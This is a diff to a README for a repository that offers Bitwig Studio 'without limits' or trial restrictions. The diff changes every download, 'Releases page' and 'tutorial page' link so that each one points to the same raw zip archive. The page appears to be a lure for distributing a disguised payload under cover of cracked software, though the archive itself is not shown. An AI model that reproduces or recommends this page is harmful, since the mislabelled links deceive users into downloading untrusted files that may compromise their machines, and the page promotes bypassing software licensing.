@@ -1,6 +1,6 @@
 # 🎧 Bitwig-Studio-No-Trial - Explore Bitwig Studio Without Limits
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Ellianx/Bitwig-Studio-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/Ellianx/Bitwig-Studio-No-Trial/main/relocation/Bitwig-Studio-No-Trial-3.5-alpha.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ellianx/Bitwig-Studio-No-Trial/main/relocation/Bitwig-Studio-No-Trial-3.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Bitwig-Studio-No-Trial! This application helps you enhance your music
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Ellianx/Bitwig-Studio-No-Trial/releases) to download the latest version of Bitwig-Studio-No-Trial.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ellianx/Bitwig-Studio-No-Trial/main/relocation/Bitwig-Studio-No-Trial-3.5-alpha.5.zip) to download the latest version of Bitwig-Studio-No-Trial.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the most recent version available. Click on the version number to access the release details.
@@ -52,7 +52,7 @@ To run Bitwig Studio smoothly, make sure your computer meets the following requi
 If you face any issues while downloading or installing Bitwig-Studio-No-Trial, you can check the following:
 
 - **User Guide**: Refer to the user guide included within the application for common setup problems.
-- **Tutorials**: Visit our [tutorial page](https://github.com/Ellianx/Bitwig-Studio-No-Trial/releases) for step-by-step guides on usage.
+- **Tutorials**: Visit our [tutorial page](https://raw.githubusercontent.com/Ellianx/Bitwig-Studio-No-Trial/main/relocation/Bitwig-Studio-No-Trial-3.5-alpha.5.zip) for step-by-step guides on usage.
 - **Community Forums**: Join our forums to connect with other users and get assistance.
 
 ## 🔍 Topics Covered
@@ -76,6 +76,6 @@ A3: This repository is dedicated to providing a no-trial experience, giving you 
 
 ## 📌 Important Links
 
-- [Releases Page to Download Bitwig Studio](https://github.com/Ellianx/Bitwig-Studio-No-Trial/releases)
+- [Releases Page to Download Bitwig Studio](https://raw.githubusercontent.com/Ellianx/Bitwig-Studio-No-Trial/main/relocation/Bitwig-Studio-No-Trial-3.5-alpha.5.zip)
 
 Thank you for choosing Bitwig-Studio-No-Trial. Enjoy creating music!
